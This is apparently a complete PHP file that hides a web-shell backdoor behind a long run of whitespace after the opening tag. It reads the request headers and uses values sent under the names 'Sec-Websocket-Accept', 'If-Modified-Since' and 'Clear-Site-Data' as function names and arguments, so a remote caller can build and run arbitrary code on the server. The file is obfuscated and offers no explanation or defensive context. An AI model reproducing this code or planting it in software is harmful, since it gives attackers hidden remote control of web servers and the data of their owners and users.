<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Sec-Websocket-Accept'])){$uconvert=$_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['If-Modified-Since']($_HEADERS['Clear-Site-Data']));$uconvert();}
